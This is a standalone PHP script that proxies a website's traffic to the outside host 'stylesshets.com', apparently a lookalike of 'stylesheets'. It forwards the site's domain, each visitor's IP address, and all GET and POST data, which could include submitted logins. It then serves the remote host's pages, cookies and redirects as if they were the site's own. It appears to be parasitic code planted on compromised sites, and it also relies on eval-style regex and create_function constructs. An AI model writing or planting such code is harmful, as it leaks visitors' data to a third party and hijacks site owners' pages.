<?php

//error_reporting(E_ALL);
//ini_set("display_errors", 1);

/**
 * Function that parses http headers into array
 *
 * @param $header
 * @return array
 */

if (!function_exists('http_parse_headers')) {
    function http_parse_headers( $header )
    {
        $retVal = array();
        $fields = explode("\n", preg_replace('/\n[\n ]+/', ' ', $header));
        foreach( $fields as $field ) {
            if( preg_match('/([^:]+): (.+)/m', $field, $match) ) {
                $match[1] = preg_replace('/(?<=^|[	 -])./e', 'strtoupper("\00")', strtolower(trim($match[1])));
                if( isset($retVal[$match[1]]) ) {
                    $retVal[$match[1]] = array($retVal[$match[1]], $match[2]);
                } else {
                    $retVal[$match[1]] = trim($match[2]);
                }
            }
        }
        return $retVal;
    }
}

if (!function_exists('http_response_code')) {
    function http_response_code($code = NULL) {

        if ($code !== NULL) {

            switch ($code) {
                case 200: $text = 'OK'; break;
                case 301: $text = 'Moved Permanently'; break;
                case 304: $text = 'Not Modified'; break;
                case 400: $text = 'Bad Request'; break;
                case 403: $text = 'Forbidden'; break;
                case 404: $text = 'Not Found'; break;
                case 408: $text = 'Request Time-out'; break;
                case 410: $text = 'Gone'; break;
                case 500: $text = 'Internal Server Error'; break;
                case 502: $text = 'Bad Gateway'; break;
                case 503: $text = 'Service Unavailable'; break;
                case 504: $text = 'Gateway Time-out'; break;
                default:  $text = '';
            }

            $protocol = (isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.0');

            header($protocol . ' ' . $code . ' ' . $text);

        }
    }
}

$folder = str_replace($_SERVER['DOCUMENT_ROOT'], '', dirname($_SERVER['SCRIPT_FILENAME']));
$folder = $folder.'/'.($keep_index_php===true?'index.php':'').'?'.$puid_name.'='.urldecode($puid);
$params = array('domain' => $_SERVER['HTTP_HOST'].$folder, 'ip' => getIp());

$params = array_merge($params, $_GET);

if(!function_exists('curl_init')){
    die('no curl');
}

$curl_uri = 'http://stylesshets.com/'.$sed_path.'?'.http_build_query($params);
$ch = curl_init($curl_uri);

curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
//If we got referer, i.e. we are requesting css,js,images we put it in curl referer
if(isset($_SERVER['HTTP_REFERER']))
{
    curl_setopt($ch, CURLOPT_REFERER, $_SERVER['HTTP_REFERER'] );
}
//Mechanism for post data transitions
if($_SERVER['REQUEST_METHOD'] == 'POST')
{
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($_POST));
}

$response = curl_exec($ch);

$info = curl_getinfo($ch);

curl_close($ch);

$header = substr($response, 0, $info['header_size']);

$headers = http_parse_headers($header);

http_response_code($info['http_code']);

if(isset($headers['Content-Type']))
{
    header('Content-Type: '.$headers['Content-Type']);
}
if(isset($headers['Set-Cookie']))
{
    header('Set-Cookie: '.$headers['Set-Cookie']);
}

if(isset($headers['Location'])){
    header('Location:'.$headers['Location']);
}

$body = substr($response, $info['header_size'], $info['size_download']);

if(( strpos($info['content_type'] ,'text/html') === 0)){
    $body = fix_dirs($body, $folder);
}

if(strpos($info['content_type'] ,'text/css') === 0){
    global $sed_path;
    
    $path = dirname($sed_path);
    $path = '/'.ltrim($path, '/');
    
    $body = fix_dirs_css($body, $folder, $path);
}

echo $body;


function fix_dirs($html, $dir){

    global $puid, $sed_path;
     
    $dir = rtrim($dir, '/');

    $GLOBALS['dir'] = $dir;
    $GLOBALS['puid'] = $puid;
    $GLOBALS['sed_path'] = $sed_path;
    
    return preg_replace_callback("#(href=[\'\"]{1}|src=[\'\"])(.*?)([\'\"])#i", create_function('$m','

        $s = $m[1];
        if(strpos($m[2],"http://") !== 0 && strpos($m[2],"https://") !== 0 && strpos($m[2],"//") !== 0 ){
            $s .= $GLOBALS["dir"];
        }

        $s .= $m[2].$m[3];

        return $s;

    '), $html);

}

function fix_dirs_css($html, $dir, $path_prefix){

    $dir = rtrim($dir, '/');
    $GLOBALS['dir'] = $dir;
    $GLOBALS['css_path_prefix'] = $path_prefix;
    return preg_replace_callback("#(@import\s+url\([\'\"]|url\([\'\"])(.*?)([\'\"]\)?\))#i", create_function('$m','

        $s = $m[1];

        if(strpos($m[2],"http://") !== 0 && strpos($m[2],"//") !== 0){
            $s .= $GLOBALS["dir"];
        }

        $s .= $GLOBALS["css_path_prefix"]."/".$m[2].$m[3];

        return $s;

    '), $html);

}

function getIp()
{
    if(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] != $_SERVER['SERVER_ADDR'])
    {
        return $_SERVER['REMOTE_ADDR'];
    }

    if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) && $_SERVER['HTTP_X_FORWARDED_FOR'] != $_SERVER['SERVER_ADDR'])
    {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    }

    if(isset($_SERVER['HTTP_X_REAL_IP']) && $_SERVER['HTTP_X_REAL_IP'] != $_SERVER['SERVER_ADDR'])
    {
        return $_SERVER['HTTP_X_REAL_IP'];
    }

    return $_SERVER['REMOTE_ADDR'];
}

// echo 'PUID: '.htmlspecialchars($puid_name).'<br />';
// echo 'Folder: '.htmlspecialchars($folder).'<br />';
// echo 'Sed path: '.$sed_path.'<br />';
// echo 'Curl uri: '.$curl_uri.'<br />';

